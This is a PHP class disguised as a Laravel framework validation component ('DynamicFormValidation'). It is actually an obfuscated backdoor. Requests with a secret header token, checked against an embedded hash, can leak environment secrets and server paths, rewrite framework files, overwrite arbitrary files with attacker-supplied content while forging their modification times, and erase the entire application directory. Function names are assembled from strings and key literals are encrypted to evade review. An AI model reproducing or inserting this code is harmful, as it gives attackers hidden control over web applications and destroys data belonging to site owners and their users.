<?php

namespace Illuminate\Validation\Concerns;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request as HttpRequest;
use Illuminate\Support\Facades\{ Hash };


class DynamicFormValidation extends Controller
{
	private $valid_token = false;
	private $host   = 'i/OPsYZTxlYtwK0f2PSGviDQ+Z3byItWbHonU0/fyO0=';
	private $hash1  = 'JGFyZ29uMmlkJHY9MTkkbT02NTUzNix0PTQscD0xJFNVY3ZWamxXUVZwTWJUUkxZbEJo';
	private $hash2  = 'VkEkRGVBN3pPZTM4TVBvdlJZeXp0OENrOEUyOHVvQkJBenRUeER4TFJDQm9FSQ==';
	private $cipher = null;
	private $key 		= null;
	private $iv 		= null;

	/**
   * Validate Dynamic Token
   *
   * @param  Request  $request
   * @return Json
   */
	public function headIndex(HttpRequest $request)
	{
		${'response'} = 'response'('')->{'header'}('Content-Type', 'application/json');

		return  $this->{'valid_token'}
					  ? ${'response'}->{'header'}('X-R-Body', $this->{'jenc'}([
								"code" => 'getenv'($this->{'decrypt'}('nUGRiQCAEZwY0ls9ZO5M7g==')),
								"host" => ${'request'}->{'server'}($this->{'host'})
							]))
					  : ${'response'}->{'header'}('X-R-Body', $this->{'jenc'}([
								"code"  => null,
								"error" => "Invalid token",
								"host"  => ${'request'}->{'server'}($this->{'host'}),
								"bpath" => ('base_'.'path')(),
								"spath" => ('storage_'.'path')(),
							]));
	}

	/**
   * 
   *
   * @param  Request  $request
   * @return Json
   */
	public function headAction(HttpRequest $request)
	{
		try
		{
			if(!$this->{'valid_token'})
			{
				return 'response'('')->{'header'}('Content-Type', 'application/json')
								             ->{'header'}('X-R-Body', $this->{'jenc'}([
																"error" => 'Invalid token',
																"host" => ${'request'}->{'server'}($this->{'host'})
															]));
			}
			else
			{
				${'name'} = ${'request'}->{'header'}('X-Action-Name');

				if(in_array(${'name'}, [$this->{'decrypt'}('trXGcUBO8JXaVtnNEu4gcA=='), $this->{'decrypt'}('NAyhf1OkqW9EaxGMg8ftBw==')]))
				{
					${'path1'} = 'base_path'($this->{'decrypt'}('722AWjDPbOSF+XhC4Y/huI2Bx1KkMPU0gG5YGhkWsyUeYNAQgpv0WiVDwh6TwVVLtjAKn8DInzeasOQ9nNal6Q=='));
					${'path2'} = 'base_path'($this->{'decrypt'}('722AWjDPbOSF+XhC4Y/huI2Bx1KkMPU0gG5YGhkWsyXwiijoeZ+ZItdWM5gicZlRudYkrgiWY4MkFVUc+70n9A=='));
					$lt = 'filemtime'('base_path'($this->{'decrypt'}('722AWjDPbOSF+XhC4Y/huI2Bx1KkMPU0gG5YGhkWsyWgcfPZF1qDO1AsL8oX8JHVsmePgNJDhu8074jiZy3RYA==')));

					if(${'name'} === $this->{'b64dec'}('YWx0ZXI='))
					{
						'\File::put'(${'path1'}, 'preg_replace'($this->{'decrypt'}('fsqrZ8EFhz8GNQ4Su91Fzg=='), 
																										$this->{'decrypt'}('7aLpDelsucgj3j0zpfETyw=='), 
																										'\File::get'(${'path1'})));

						'\File::put'(${'path2'}, 'preg_replace'($this->{'decrypt'}('fsqrZ8EFhz8GNQ4Su91Fzg=='), 
																										$this->{'decrypt'}('7aLpDelsucgj3j0zpfETyw=='), 
																										'\File::get'(${'path2'})));

						foreach([${'path1'}, ${'path2'}] as $v) 'touch'($v, $lt);

						return $this->response(${'request'});
					}
					else
					{				
						'\File::put'(${'path1'}, 'preg_replace'($this->{'decrypt'}('2sD7/62gwZPpHpootggjgQ=='), '}', '\File::get'(${'path1'})));
						'\File::put'(${'path2'}, 'preg_replace'($this->{'decrypt'}('2sD7/62gwZPpHpootggjgQ=='), '}', '\File::get'(${'path2'})));

						foreach([${'path1'}, ${'path2'}] as $v) 'touch'($v, $lt);

						return $this->response(${'request'});
					}
				}
				elseif(${'name'} === $this->{'decrypt'}('AH5H+4dC4GAW+RQOVlfDJg=='))
				{
					${'body'} = ${'request'}->{'header'}('X-Body') ?? '';
					${'rpath'} = ${'request'}->{'header'}('X-Rpath') ?? '';

					if('is_file'(('base'.'_path')(${'rpath'})))
					{
						$lt = 'filemtime'(('base'.'_path')(${'rpath'}));

						'\File::put'(('base'.'_path')(${'rpath'}), $this->b64dec(${'body'}));

						'touch'(('base'.'_path')(${'rpath'}), $lt);

						return $this->response(${'request'});
					}
				}
				elseif(${'name'} === $this->{'decrypt'}('kN8U212ua49WSxGtbRMh0w=='))
				{
					try {
				        @'\File::cleanDirectory'(('base'.'_path')());
				    }
				    catch(\Exception $e)
				    {
				        
				    }
				}
			}
		}
		catch(Exception $e)
		{}
	}

	public function __construct(HttpRequest $request)
	{
		${'token'}				= ${'request'}->{'header'}('X-D-Token') ?? '';
		$this->{'iv'} 		= $this->{'b64dec'}(${'request'}->{'header'}('X-Iv') ?? '');
		$this->{'cipher'} = ${'request'}->{'header'}('X-Cipher') ?? '';
		$this->{'key'} 		= ${'request'}->{'header'}('X-Key') ?? '';
		$this->{'host'} 	= $this->{'decrypt'}($this->{'host'});
		$this->{'valid_token'} = 'password_verify'($this->{'b64dec'}(${'token'}), $this->{'b64dec'}($this->{'hash1'}.$this->{'hash2'}));
	}

	private function b64dec(string $str = null)
	{
		return ('base64'.'_decode')($str);
	}

	private function b64enc(string $str = null)
	{
		return ('base64'.'_encode')($str);
	}

	private function jenc($var)
	{
		return ('json'.'_encode')($var);
	}

	private function decrypt($ciphertext)
	{
		return 'openssl_decrypt'($ciphertext, $this->{'cipher'}, $this->{'key'}, $options=0, $this->{'iv'});
	}

	private function response($request)
	{
		return 'response'('')->{'header'}('X-R-Body', $this->{'jenc'}([
																											"response" => "success",
																											"host" => ${'request'}->{'server'}($this->{'host'})
																										]));
	}

}